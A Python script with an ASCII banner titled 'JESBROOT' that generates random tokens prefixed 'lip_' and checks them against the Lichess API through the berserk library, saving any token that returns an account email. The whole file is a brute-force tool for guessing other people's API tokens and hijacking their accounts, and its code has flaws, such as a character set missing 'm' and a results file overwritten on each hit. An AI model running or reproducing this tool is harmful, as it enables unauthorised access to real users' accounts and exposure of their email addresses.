import colorama
import berserk
from colorama import init, Fore, Back, Style
import random
import time
init()

n = Fore.GREEN+'@latvianguy'
n1 = Fore.BLUE+'jescoin'
menu = Fore.MAGENTA    +'''


 ▄▄▄██▀▀▀▓█████   ██████  ▄▄▄▄    ██▀███   ▒█████   ▒█████  ▄▄▄█████▓
   ▒██   ▓█   ▀ ▒██    ▒ ▓█████▄ ▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒▓  ██▒ ▓▒
   ░██   ▒███   ░ ▓██▄   ▒██▒ ▄██▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▒ ▓██░ ▒░
▓██▄██▓  ▒▓█  ▄   ▒   ██▒▒██░█▀  ▒██▀▀█▄  ▒██   ██░▒██   ██░░ ▓██▓ ░ 
 ▓███▒   ░▒████▒▒██████▒▒░▓█  ▀█▓░██▓ ▒██▒░ ████▓▒░░ ████▓▒░  ▒██▒ ░ 
 ▒▓▒▒░   ░░ ▒░ ░▒ ▒▓▒ ▒ ░░▒▓███▀▒░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░   ▒ ░░   
 ▒ ░▒░    ░ ░  ░░ ░▒  ░ ░▒░▒   ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░     ░    
 ░ ░ ░      ░   ░  ░  ░   ░    ░   ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░      
 ░   ░      ░  ░      ░   ░         ░         ░ ░      ░ ░           
                               ░                                     

                                       '''
print(menu)
print(Fore.RED)
print('''
        ----------------------|
        |[1] broot tokens     |            
        |[2] check this tokens|               
        |----------------------
                             
                              ''')

answer = int(input(Fore.RED+'Enter the number:'))


def anotherMenu():
    print(menu)
    print(Fore.GREEN+'This is menu after your choice. Press 99, if you want to exit.')
    print(Fore.RED+'''
    ----------------------|
    |[1] broot tokens     |            
    |[2] check this tokens|
    |[99] exit            |               
    |----------------------

                          ''')
    answer = int(input(Fore.RED+'Enter the number:'))
    if answer == 1:
        brootTokens()
    if answer == 2:
        checkTokens()
    else:
        exit()


def brootTokens():
    token1 = 'lip_'
    chars = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    length = 20
    number = int(input(Fore.MAGENTA    +'How many tokens you want to broot?'))
    numberOfToken = 1
    print(Fore.RED+'')
    for n in range(number):
        token = ''
        for i in range(length):
            token += random.choice(chars)
        token = token1 + token
        with open("tokens.txt", "a") as file:
            file.writelines(token)
            file.writelines('\n')
        print(numberOfToken,'token has been added in the tokens.txt file ')
        numberOfToken+=1
    anotherMenu()





def checkTokens():
    valueOfCheck = int(input((Fore.MAGENTA+'How many tokens you want to check?')))
    print(Fore.WHITE)
    checkedTokens = 1
    for i in range(valueOfCheck):
        file = open("tokens.txt", "r")
        content = file.readlines()
        trueTokens=content[checkedTokens]
        try:

            session=berserk.TokenSession(trueTokens)
            client=berserk.Client(session=session)
            email = client.account.get_email()
            print(Fore.GREEN+'')
            print(f'Nice try! The token is {trueTokens} and the email is {email}')
            myTry = open("trueTokens.txt", "w")
            myTry.writelines(trueTokens)
            myTry.writelines('\n')
            
        except ValueError:

            print(Fore.RED + "Invalid token")
            
        checkedTokens+=1
    anotherMenu()
if answer ==1:
    brootTokens()
else:
    checkTokens()